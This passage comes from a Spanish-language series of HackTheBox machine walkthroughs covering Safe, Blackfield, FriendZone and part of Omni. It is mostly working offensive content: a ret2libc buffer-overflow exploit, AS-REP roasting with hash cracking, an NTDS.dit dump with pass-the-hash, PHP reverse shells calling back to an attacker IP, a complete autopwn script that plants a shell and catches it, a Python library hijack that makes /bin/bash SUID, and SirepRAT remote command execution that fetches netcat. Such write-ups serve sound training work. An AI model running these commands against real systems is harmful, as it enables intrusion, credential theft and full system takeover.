system_plt = p64(0x401040)
main = p64(0x40115f)
got_puts = p64(0x404018)

payload = junk + pop_rdi + got_puts + system_plt + main # system("whoami")

print(p.recvline())
p.sendline(payload)
leak_puts = u64(p.recvline().strip()[7:-11].ljust(8, "\x00".encode()))

log.info("Leaked puts address: %x" % leak_puts)

libc_leaked = leak_puts - 0x68f90
log.info("Leaked libc address: %x" % libc_leaked)
bin_sh = p64(libc_leaked + 0x161c19)

payload = junk + pop_rdi + bin_sh + system_plt

p.recvline()
p.sendline(payload)

p.interactive()
```

La idea aqui seria de hacer una llamad a nivel de systema para arastrar la direccion de **puts**. El objetivo detras de esto es poder leakear la direccion para
poder computar la direccion de  **libc**. Esto no permiteria computar una direccion donde este una string de `/bin/sh`. 

Esto se hace poniendo una direccion memoriaa una llamada de systema (esto nos dara un error)

```python
import os

os.system("whoami")
#Output
root

os.system("0x7fbac32bda8")
#Output
Error Not found.
```

y desde este error, aprovechar de recuperar la direccion de puts. Desde aqui podriamos encontrar todas la direcciones necessarias para ejecutar los comandos que queremos.
Para encontrar las direcciones podemos usar la web de [nullbyte](https://libc.nullbyte.cat/?q=puts%3Af90&l=libc6_2.24-11%2Bdeb9u4_amd64), podemos encontrar todos
los offsets de los comandos que queremos como el offset de la direccion de `system` y de la string `/bin/sh` basada por la direccion de puts.

- la direccion de libc seria la direccion de puts menos el offset de puts de la web
- la direccion de system seria la direccion de libc mas el offset de system
- la direccion de la string `/bin/sh` seria la direccion de libc mas el offset de str_bin_sh

<!--chapter:end:41-Safe/41-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con un BOF x64 {-}


```bash
python3 exploit.py
#Output
$

whoami user
cat /home/user/user.txt
```

Ya tenemos la flag.

<!--chapter:end:41-Safe/41-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
ls /home/user
```

Vemos un fichero `MyPassword.kdbx` y una serie de imagenes. Lo descargamos en nuestra maquina de atacante.

- en la maquina victima

    ```bash
    which busybox
    busybox httpd -f -p 8000
    ```

- en la maquina de atacante descargamos con `wget` todas las imagenes y el fichero `MyPasswords.kdbx`

Intentamos abrir el ficher `MyPasswords.kdbx` con la utilidad **keepassxc**

```bash
keepassxc MyPasswords.kdbx
```

Vemos que nos pregunta por una contraseña pero vemos que hay un fichero clave que seria una de las imagenes.
Podemos tratar de recuperar el hash del fichero con `keepass2john` pero tenemos que tener en cuenta que si hay un fichero
que esta utilizado como seguridad, tenemos que añadir el parametro -k.

```bash
keepass2john MyPasswords.kdbx -k IMG_0545.JPG
```

Como no sabemos exactamente que imagen es la buena, utilizaremos un oneLiner

```bash
for IMG in $(echo "IMG_0545.JPG IMG_0546.JPG IMG_0547.JPG IMG_0548.JPG IMG_0552.JPG IMG_0553.JPG "); do keepass2john -k $IMG MyPasswords.kdbx | sed "s/Mypasswords/$IMG/"; done > hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

Encontramos la contraseña con la imagen 0547. Si abrimos el keepassxc dando la imagen como keyfile y con la contraseña podemos entrar y vemos un directorio
llamado Root Password

ya podemos utilizar el comando `su root` y leer la flag.




<!--chapter:end:41-Safe/41-04-PrivilegeEscalation.Rmd-->

# Blackfield {-}

## Introduccion {-}

La maquina del dia se llama Blackfield.

El replay del live se puede ver aqui

[![S4vitaar Blackfield maquina](https://img.youtube.com/vi/cIDYqSOlECs/0.jpg)](https://www.youtube.com/watch?v=cIDYqSOlECs)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:42-Blackfield/42-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.192
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.192
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.192 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p53,88,135,139,389,445,593,3268,49676 10.10.10.192 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?                       | Que falta?                |
| ------ | ---------- | ---------------------------------------- | ------------------------- |
| 53     | domain     | Domain controller rpcclient null session |                           |
| 88     | Kerberos   | asproasting attack                       | lista de usuarios validos |
| 135    | msrpc      |                                          |                           |
| 139    | netbios    |                                          |                           |
| 389    | LDAP       | Bloodhound                               | credenciales              |
| 445    | smb        | Null session                             |                           |
| 593    | ncacn_http |                                          |                           |
| 3268   | ldap       |                                          |                           |
| 5985   | WinRM      | evil-winrm                               | credenciales              |
| 49676  | ncacn_http | Puertos por defecto de windows           |                           |


### Buscando ususarios con rpcclient y rpcenum {-}

```bash
rpcclient -U "" 10.10.10.192 -N

rpcclient $> enumdomusers
```

Como no nos deja unumerar cosas con el null session vamos a necesitar credenciales validas para poder hacerlo

### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.192
smbclient -L 10.10.10.192 -N
```

Vemos que estamos en frente de una maquina Windows 10 Standard de 64 bit pro que se llama **DC01** en el dominio **BLACKFIELD.local**.
Añadimos los dominios `blackfield.local` y `dc01.blackfield.local` a nuestro `/etc/hosts`.

Tambien vemos recursos compartidos a nivel de red como:

- ADMIN$
- C$
- forensic
- IPC$
- NETLOGON
- profiles$
- SYSVOL

Usando de la heramienta smbmap, podemos ver si tenemos accessos a estos recursos.

```bash
smbmap -H 10.10.10.192 -u 'null'
```

y vemos que denemos accesso con derecho de lectura a los recursos `profiles$` y `IPC$`. IPC$ no es un recurso que nos interesa.

```bash
smbclient //10.10.10.192/profiles$ -N
dir
```

Aqui podemos ver registros que parecen ser directorios de ususarios.

<!--chapter:end:42-Blackfield/42-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Asproasting Attack {-}

Una vez que tenemos un listado de usuarios, podemos hacer un **asproating attack**

1. copiamos todos los usuarios en un fichero llamado users

    ```bash
    nano users_dir
    Ctrl+shift+v

    cat users_dir | awk '{print $1}' > users
    rm users_dir
    ```

1. Con `GetNPUsers.py` vamos a ver si podemos recuperar un TGT

    ```bash
    GetNPUsers blackfield.local/ -no-pass -usersfile users | grep -v "not found"
    ```

Aqui vemos el TGT del usuario **support**. Esto quiere decir que este usuario tenia el *Don't required pre-auth* seteado. Copiamos todo el hash 
del usuario svc-alfresco en un fichero llamado hash y lo crackeamos con John


### Crackeando el hash con John {-}

```bash
john -wordlists=/usr/share/wordlists/rockyou.txt hash
```

Aqui encontramos su contraseña. Ya podemos effectuar un Kerberoasting attack. Pero primero, como siempre, credenciales encontradas son 
credenciales que checkeamos con crackmapexec

```bash
crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight'
```

Aprovechamos para ver si nos podemos conectar via winrm.

```bash
crackmapexec winrm 10.10.10.192 -u 'support' -p '#00^BlackKnight'
```

Aqui vemos que el usuario es valido y que tiene permiso de lectura sobre el directorio **SYSVOL** y que lo normal seria de buscar si existe un
fichero `groups.xml`, porque a dentro tienes un `cpassword=HASH` que contiene un hash que se podria crackear con la heramienta **gpp-decrypt** pero 
Tito no adelanta que no es el caso no se aplicaba.

### Kereroasting attack {-}

Los ataques Kereroasting se pueden manejar con la utilidad `GetUserSPNs.py`

```bash
GetUserSPNs.py blackfield.local/support:#00^BlackKnight@10.10.10.192 -request -dc-ip 10.10.10.192
```

Esta utilidad nos retorna un mensaje como que no son las buenas credenciales.

### Enumeracion de usuarios con rpcclient {-}

Ahora que tenemos credenciales validas, intentamos connectarnos al `rpcclient`

```bash
rpcclient -U "support%#00^BlackKnight" 10.10.10.192

> rpcclient $> enumdomusers
```

Ahora podemos ver la lista de los usuarios registrados a nivel de systema. Buscamos usuarios del grupo Admins via la busqueda de los diferentes grupos.

```bash
> rpcclient $> enumdomgroups
```

copiamos el rid del grupo `Domain Admins` 

```bash
> rpcclient $> querygroupmem 0x200
```

Aqui podemos ver el **rid** del usuario que hace parte del grupo admin.

```bash
> rpcclient $> queryuser 0x1f4
```

Vemos quel usuario es **Administrator**, pero lo hacemos para saber si hay otros usuarios administradores pero aqui no es el caso.

### Enumeracion del systema con bloodhound-python para ganar acceso a la maquina {-}

Con la utilidad `bloodhound-python`, podemos enumerar cosas si tener que estar connectado a la maquina victima.

1. instalamos bloodhound

    ```bash
    pip3 install bloodhound
    ```

1. lanzamos bloodhound-python

    ```bash
    bloodhound-python
    bloodhound-python -c ALL -u support -p '#00^BlackKnight' -ns 10.10.10.192 -dc dc01.blackfield.local -d blackfield.local 
    ```

    esto nos crea un reporte en formato json.

1. instalamos bloodhound y neo4j

    ```bash
    sudo apt install neo4j bloodhound
    ```

1. lanzamos neo4j service

    ```bash
    sudo neo4j console
    ```

1. lanzamos bloodhound

    ```bash
    bloodhound --no-sandbox &> /dev/null &
    disown
    ```

1. connectamos bloodhound al neo4j database

1. Drag & Drop de los ficheros **.json** hacia la ventana del bloodhound y en el Analysis tab

    - Find Shortest Paths to Domain Admins
    - Find Paths from Kerberoastable Users
    - Find AS-REP Roastable Users
    

Aqui no vemos gran cosa, lo unico el usuario support que es asreproasteable pero poco mas. Analizamos los nodos de este usuario.
Le damos un clic derecho al usuario y lo seteamos a Mark User as Owned.
Vamos a Node Info y miramos donde hay un 1.

Vemos que el usuario **support** puede forzar un cambio de contraseña al usuario **AUDIT2020**  


### Forzar un cambio de contraseña con rpcclient {-}

```bash
rpcclient -U "support%#00^BlackKnight" 10.10.10.192

> rpcclient $> setuserinfo2 audit2020 24 s4vitar123$!
```

Ahora que hemos cambiado la contraseña, lo miramos con **crackmapexec**

```bash
crackmapexec smb 10.10.10.192 -u 'audit2020' -p 's4vitar123$!'
```

El cambio de contraseña a sido effectiva y ahora miramos que privilegios tiene en los recursos compartidos tiene a nivel de red.

```bash
smbmap -H 10.10.10.192 -u 'audit2020' -p 's4vitar123$!'
```

Vemos que este usuario tiene privilegios de lectura sobre el directorio `forensic`. Miramos lo que hay en este directorio.





<!--chapter:end:42-Blackfield/42-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con Win-RM {-}

```bash
smbclient //10.10.10.192/forensic -U 'audit2020%s4vitar123$!'
dir
cd commands_output
get domain_users.txt
get domain_admins.txt
cd ..
cd memory_analysis
dir
get lsass.zip
```

Nos hemos descargados un fichero domain_users y un fichero domain_admins. Podemos ver un usuario **iPownedYourCompany** que nos hace
pensar que esta maquina a sido comprometida anteriormente. Tambien vemos un directorio memory_analysis y un fichero nos llama la atencion.
Este fichero es el `lsass.zip`. Nos llama la atencion porque hay una utilidad `pypykatz` con la cual podriamos ver informaciones relevantes dumpeadas
a nivel de memoria. 

```bash
unzip lsass.zip
pypykatz lsa minidump lsass.DMP
```

Aqui tenemos informaciones como usuarios y contraseña **NT** hasheadas. Los NT Hashes nos permiten hacer **PassTheHash** que simplemente seria connectarnos
con el usuario poniendo la contraseña hasheada (No se necesita conocer la contraseña en este caso).

Vemos el hash del usuario Administrator. Controlamos esto con crackmap exec.

```bash
crackmapexec smb 10.10.10.192 -u 'Administrator' -H '7f1e4ff8c5a8e6b5fcae2d9c0472cd62'
```

Pero vemos que esta credencial no es valida. Vemos otro usuario `svc_backup` lo miramos.

```bash
crackmapexec smb 10.10.10.192 -u 'svc_backup' -H '9659d1d1dcd9250115e2206d9f49400d'
```

Esta credencial esta valida. Intentamos ver si nos podemos conectar con winrm

```bash
crackmapexec winrm 10.10.10.192 -u 'svc_backup' -H '9659d1d1dcd9250115e2206d9f49400d'
```

Aqui vemos que este usuario es Pwn3d!

```bash
evil-winrm -i 10.10.10.192 -u 'svc_backup' -H '9659d1d1dcd9250115e2206d9f49400d'

whoami 
#Output
blackfield\svc_backup

ipconfig
#Output
10.10.10.192
```

Estamos conectados como el usuario svc_backup y podemos leer la flag.

<!--chapter:end:42-Blackfield/42-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd C:\Users\Administrator
dir
cd Desktop
dir
type root.txt
whoami /priv
```

No podemos todavia leer el **root.txt**, pero tiene un privilegio muy interesante que es el privilegio **SeBackupPrivilege**.
Teniendo este privilegio, podriamos hacer una copia (backup) de seguridad de elemento del systema como el **NTDS** que nos permitirian
recuperar los hashes de los usuarios del systema, entre ellos el usuario Administrator.

```bash
cd C:\
mkdir Temp
cd Temp
reg save HKLM\system system
```

Aqui hacemos una copia del systema que es necesario para posteriormente dumpear los hashes NTLM del fichero `ntds.dit`. Intentamos copiar 
el fichero `ntds.dit`

```bash
copy C:\Windows\NTDS\ntds.dit ntds.dit
#Output
PermissionDenied!
```

Teniendo este privilegio y siguiendo la guia de la web [pentestlab](https://pentestlab.blog/tag/diskshadow/) podemos tirando de robocopy en vez de
copy, copiarnos este fichero. Creamos un fichero llamado example.txt y le ponemos los comandos siguientes.

```bash
set context persistent nowriters 
add volume c: alias savialias 
create 
expose %savialias% z:
```

> [ ! ] NOTAS: Hay que tener cuidado con estos ficheros que enviamos en maquinas windows de siempre poner un espacio al final de cada linia para evitar problemas

```bash
dos2unix example.txt
```

y desde la maquina victima, subimos el fichero

```bash
upload example.txt
diskshadow.exe /s example.txt
```

Ya podemos ver que en Z:\ hay el mismo contenido que en C:\ y si tratamos de copiar el fichero ntds.dit con el comando `copy z:\Windows\NTDS\ntds.dit ntds.dit` 
nos arastra el mismo error. Pero usando del comando robocopy esto funcciona sin problemas.

```bash
robocopy z:\Windows\NTDS . ntds.dit
download ntds.dit
download system
```

> [ ! ] NOTAS: Si el download no funcciona, siempre podemos tratar de montar un directorio compartido a nivel de red con `impacket-smbfolder`

Ya podemos dumpear el ntds con `impacket-secretsdump`

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

Ya podemos ver todos los hashes de los usuarios activos del systema.

```bash
crackmapexec winrm 10.10.10.192 -u 'Administrator' -H 194fb5e5179499be6424d4cd53b99e
```

Pwn3d!!!!


```bash
evil-winrm -i 10.10.10.192 -u 'Administrator' -H 194fb5e5179499be6424d4cd53b99e
whoami 
#Output
blackfield\administrator
```

Aqui hemos rooteado la maquina y podemos leer la flag.

<!--chapter:end:42-Blackfield/42-04-PrivilegeEscalation.Rmd-->

# FriendZone {-}

## Introduccion {-}

La maquina del dia se llama FriendZone.

El replay del live se puede ver aqui

[![S4vitaar FriendZone maquina](https://img.youtube.com/vi/C5wd5MxNcok/0.jpg)](https://www.youtube.com/watch?v=C5wd5MxNcok)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:43-FriendZone/43-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.123
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.123
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.123 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,22,53,80,139,443,445 10.10.10.123 -oN targeted
```


| Puerto | Servicio | Que se nos occure?         | Que falta?  |
| ------ | -------- | -------------------------- | ----------- |
| 21     | ftp      | Conneccion como anonymous  |             |
| 22     | tcp      | Conneccion directa         | creds       |
| 53     | domain   | axfr attack                | ip y domain |
| 80     | http     | Web, Fuzzing               |             |
| 139    | Samba    | Coneccion con null session |             |
| 443    | https    | Web, Fuzzing               |             |
| 445    | Samba    | Coneccion con null session |             |

### Coneccion ftp como anonymous {-}

```bash
ftp 10.10.10.123
Name: anonymous
Password: 
#Output
Login failed
```

### Checkeamos el certificado ssl {-}

```bash
openssl s_client -connect 10.10.10.123:443
```

Aqui vemos un un correo `haha@friendzone.red`. Añadimos el dominio friendzone.red al `/etc/hosts`.

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.123
```

Es un Apache 2.4.29 en un Ubuntu y podemos ver un nuevo dominio `friendzoneportal.red` que añadimos al `/etc/hosts`. 


#### Checkear la web {-}

Si entramos en la url `https://10.10.10.123`, No vemos gran cosas. 
Si vamos por la url `https://friendzone.red` vemos una nueva web, mirando el codigo fuente, vemos un comentario sobre un directorio
`/js/js` y si vamos por la url `https://friendzone.red/js/js` vemos una especie de hash en base64 que intentamos romper con el comando
`echo "MTZaVFhRMDBrSTE2MzUxMDgwMzRieUxPVHlmdGkz" | base64 -d | base64 -d` pero no nos da gran cosa. Si miramos la url `https://friendzoneportal.red`,
vemos otra imagen pero tampoco vemos gran cosa en este caso.


### Analyzando el SAMBA {-}

```bash
crackmapexec smb 10.10.10.123
smbclient -L 10.10.10.123 -N
```

Aqui el **smbclient** nos dice que estamos frente una maquina Windows 6.1 aun que sabemos que la maquina victima es un linux.

Vemos recursos compartidos a nivel de red como:

- print$
- Files
- general
- Development
- IPC$

Usando de la heramienta smbmap, podemos ver si tenemos accessos a estos recursos.

```bash
smbmap -H 10.10.10.123
```

y vemos que denemos accesso con derecho de lectura al directorio `general` y derechos de lectura y escritura al directorio `development`.
Vamos a conectarnos para ver lo que hay por estos registros

```bash
smbclient //10.10.10.123/general -N
dir
```

Vemos un fichero creds.txt y nos lo descargamos con el commando `get creds.txt`. 

Miramos si nos podemos conectar con `ssh admin@10.10.10.123` pero no podemos y miramos si tenemos accesso a mas registros.

```bash
smbmap -H 10.10.10.123 -u 'admin' -p 'WORKWORKHhallelujah@#'
```

### Ataque de transferencia de zona con Dig {-}

```bash
dig @10.10.10.123 friendzone.red
dig @10.10.10.123 friendzone.red ns
dig @10.10.10.123 friendzone.red mx
dig @10.10.10.123 friendzone.red axfr
```

El ataque de transferencia de zone nos permite ver una serie de subdominios como.

- administrator1.friendzone.red
- hr.friendzone.red
- uploads.friendzone.red

los introducimos en el `/etc/hosts` y lo analyzamos en firefox.

### Checkeamos los nuevos dominios {-}

Podemos ver que el `https://hr.friendzone.red` no nos muestra nada.
La url `https://uploads.friendzone.red` nos envia a una pagina donde podemos uploadear imagenes y la url
`https://administrator1.friendzone.red` nos muestra un panel de inicio de session.

Como hemos encontrado credenciales con smb, intentamos conectarnos desde el panel de inicio de session y estas credenciales son validas.

Aqui vemos que existe un fichero `dashboard.php`. Si vamos a la url `https://administrator1.friendzone.red/dashboard.php`, tenemos un mensaje que
dice que el falta el parametro image_name y que por defecto, necesitamos poner `image_id=a&pagename=timestamp`. Intentamos la url siguiente:

```bash
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=timestamp
```

Aqui nos aparece una nueva pagina. Nos llama la atencion el parametro pagename y intentamos cosas

```bash
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=timestamp
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=timestam
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=dashboard.php
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=dashboard
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=/../../../../../etc/passwd
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=/../../../../../etc/passwd%00
```

Aqui hemos constatado que podemos injectar una pagina de la web en esta misma pagina y que no se necessita poner la extension que la pagina añade
`.php` por si sola. Es por esto que no se puede ver el `/etc/passwd` porque añade un `.php` al final.




<!--chapter:end:43-FriendZone/43-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}


### Subiendo ficheros por smb {-}

Cuando hemos mirado los registros compartidos a nivel de red con smbmap, hemos constatado que teniamos derechos de lectura
y de escritura al registro Development. Y esta enumeracion nos a monstrado que el registro Files esta bindeada al directorio
`/etc/Files`. Esto no hace pensar que si subimos ficheros al registro `Development`, puede que sea finalmente bindeada al directorio 
`/etc/Development`. 

1. Creamos un fichero php de prueba

    ```php
    <?php
        echo "Esto es una prueba...";
        system("whoami");
    ?>
    ```

1. Con smbclient, subimos el fichero

    ```bash
    put test.php
    ```

1. En el dashboard, intentamos ver si vemos la pagina

    ```bash
    https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=/../../../../../etc/Development/test
    ```

Esto nos muestra que podemos ejecutar commandos a nivel de systema.

<!--chapter:end:43-FriendZone/43-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con un un LFI {-}

1. Creamos un fichero reverse.php

    ```php
    <?php
        system("bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'");
    ?>
    ```

1. Con smbclient, subimos el fichero

    ```bash
    put reverse.php
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. En el dashboard, intentamos ver si vemos la pagina

    ```bash
    https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=/../../../../../etc/Development/reverse
    ```

Ya hemos ganado acceso al systema.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Creando un autopwn en python {-}

```python
#!/usr/bin/python3

import pdb
import urllib3
import urllib

from smb.SMBHandler import SMBHandler

from pwn import *

def def_handler(sig, frame):

    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "https://administrator1.friendzone.red/login.php"
rce_url = "https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/reverse"
lport = 443

def getCreds():
    opener = urllib.request.build_opener(SMBHandler)
    fh = opener.open('smb://10.10.10.123/general/creds.txt')
    data = fh.read()
    fh.close()

    data = data.decode('utf-8')
    username = re.findall(r'(.*?):', data)[1]
    password = re.findall(r':(.*)', data)[1]

    return username, password

def makeRequest(username, password):

    urllib3.disable_warnings()

    s = requests.session()
    s.verify = False

    data_post = {
        'username': username,
        'password': password
    }

    r = s.post(login_url, data=data_post)

    os.system("mkdir /mnt/montura")
    os.system('mount -t cifs //10.10.10.123/Development /mnt/montura -o username="null",password="null",domain="WORKGROUP",rw')
    time.sleep(2)
    os.system("echo \"<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f'); ?>\" > /mnt/montura/reverse.php")
    os.system("umount /mnt/montura")
    time.sleep(2)
    os.system("rm -r /mnt/montura")

    r = s.get(rce_url)

if __name__ == '__main__':

    username, password = getCreds()

    try:
        threading.Thread(target=makeRequest, args=(username, password)).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    shell.interactive()
```

### Userpivoting {-}

```bash
grep "sh$" /etc/passwd
pwd
ls -l
cat mysql_data.conf
```

Vemos la contraseña del usuario friend y nos podemos convertir con el comando `su friend` y leer la flag.

<!--chapter:end:43-FriendZone/43-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
uname -a
find \-perm -4000 2>/dev/null
```

No vemos nada interesante por aqui. Miramos si existen tareas que se ejecutan a interval regulares de tiempo.


```bash
cd /dev/shm/
nano procmon.sh


#!/bin/bash

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
    old_process=$new_process
done
```

Le damos derechos de ejecucion y lo lanzamos. Si esperamos un poco, podemos ver que hay una tarea que se ejecuta lanzando un script
en python.

```bash
ls -l /opt/server_admin/reporter.py
cat /opt/server_admin/reporter.py
```

Vemos que no lo podemos tocar.

#### Library Hijacking {-}

Vemos que el script no hace nada en concreto. Solo importa la libreria os y almacena dos variables y le hace un print.

1. Miramos el orden de busqueda del import de python

    ```bash
    python
    > import sys
    print sys.path
    ```

    Aqui vemos que busca primeramente en el directorio actual de trabajo y despues en `/usr/lib/python2.7/sys.py`

1. Miramos nuestros derechos en la carpeta `/usr/lib/python2.7`

    ```bash
    locate os.py
    ls -l /usr/lib/ | grep "python2.7"
    ```

    Vemos que tenemos todo los derechos en esta carpeta

1. Alteramos el fichero os.py

    ```bash
    cd /usr/lib/python2.7
    nano os.py
    ```

    Al final de este fichero, añadimos el comando siguiente

    ```python
    system("chmod 4755 /bin/bash")
    ```

1. Monitorizamos la /bin/bash

    ```bash
    watch -n 1 ls -l /bin/bash
    ```

Vemos que aparece un `s` en la /bin/bash

```bash
bash -p
whoami
#Output
root
cd /root
cat root.txt
```

Ya podemos leer el root.txt

<!--chapter:end:43-FriendZone/43-04-PrivilegeEscalation.Rmd-->

# Omni {-}

## Introduccion {-}

La maquina del dia se llama Omni.

El replay del live se puede ver aqui

[![S4vitaar Omni maquina](https://img.youtube.com/vi/N9GVMEW62Qg/0.jpg)](https://www.youtube.com/watch?v=N9GVMEW62Qg)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:44-Omni/44-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.204
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.204
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.204 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p135,5985,8080,29817,29819,29820 10.10.10.204 -oN targeted
```


| Puerto | Servicio | Que se nos occure?             | Que falta?   |
| ------ | -------- | ------------------------------ | ------------ |
| 135    | msrpc    | rpcclient con nul session      |              |
| 5985   | WinRM    | evil-winrm                     | credenciales |
| 8080   | http     | Web Fuzzing                    |              |
| 29817  | msrpc    | Puertos por defecto de windows |              |
| 29819  | msrpc    | Puertos por defecto de windows |              |
| 29820  | msrpc    | Puertos por defecto de windows |              |

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.204:8080
```

Es un Windows Device Portal con un HTTPapi y un WWW-Athentication.

#### Checkear la web {-}

Si entramos en la url `http://10.10.10.204:8080`, Vemos un panel basic authentication.


#### Checkeando la cavezera con curl {-}

```bash
curl -s -X GET "http://10.10.10.204:8080"
curl -s -X GET "http://10.10.10.204:8080" -I
```

Vemos en la cabezera que el basic-auth es sobre un `Windows Device Portal`
Buscamos si existe una vulnerabilidad asociada en google poniendo `Windows Device Portal github exploit` y encontramos
una pagina interesante de [SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT) que nos permitiria ejecutar RCE.

<!--chapter:end:44-Omni/44-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Windows Device Portal {-}

```bash
git clone https://github.com/SafeBreach-Labs/SirepRAT
cd SirepRAT
python3 setup.py install
pip install -r requirements.txt

python3 SirepRAT.py
```

Intentamos leer un archivo de la maquina victima

```bash
python3 SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --v
```

Aqui vemos que podemos leer archivos del systema. Intentamos ejecutar comandos.

Nos ponemos en escucha por trasa ICMP

```bash
tcpdump -i tun0 icmp -n
```

y ejecutamos el comando

```bash
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args " /c ping 10.10.14.8" --v
```

Aqui vemos que recibimos la traza y que tenemos capacidad de ejecucion remota de comando.

<!--chapter:end:44-Omni/44-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con SirepRAT {-}

1. Descargamos nc64

    ```bash
    wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
    ```

1. Creamos un servidor web con python

    ```bash
    python3 -m http.server 80
    ```

1. Intentamos descargar el binario desde la maquina victima

    ```bash
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c certutil.exe -f -urlcache -split http://10.10.14.8/nc64.exe C:\Windows\Temp\nc64.exe" --v
    ```

Aqui vemos que no a pasado nada y que no hemos recibido ningun GET a nuestro servidor python.

Miramos si funcciona usando un directorio [applocker](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)

```bash
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c certutil.exe -f -urlcache -split http://10.10.14.8/nc64.exe C:\Windows\System32\spool\drivers\color\nc64.exe" --v
```

No funcciona. Intentamos con Powershell

```bash
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "powershell" --args " /c iwr -uri http://10.10.14.8/nc64.exe -OutFile C:\Windows\System32\spool\drivers\color\nc64.exe" --v
```

Ahora si. Intentamos entablarnos una reverseshell.

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Lanzamos la shell

    ```bash
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.8 443" --v
    ```

Ya estamos a dentre de la maquina victima.

```bash
whoami
#Output
'whoami' is not recognized as an internal or external command.

echo %USERNAME%
#Output
Omni
```

Como no hay directorio de usuarios en la maquina buscamos recursivamente por un fichero llamado `user.txt`

```bash
dir /r /s user.txt
cd C:\Data\Users\app
type user.txt
```

Aqui vemos quel fichero esta de typo `System.Management.Automation.PSCredential` que significa que esta cifrado. Intentamos leerlo con
el comando `(Import-CliXml -Path user.txt)` pero no nos deja. Miramos los derechos de este fichero con `icacls user.txt` y vemos quel usuario
app tiene los derechos full para este fichero. Esto significa que nos tenemos que convertir en el usuario **app**. 


### User Pivoting {-}


Lo raro aqui es que si hacemos 
un `net user`, no vemos que existe el usuario **omni** y esto es turbio porque tambien podria decir que somos un usuario privilegiado.

Si creamos una carpeta en `C:\Data\Users` vemos que podemos crearla sin problema. Intentamos ver si podemos recuperar cosas como **sam**.

```bash
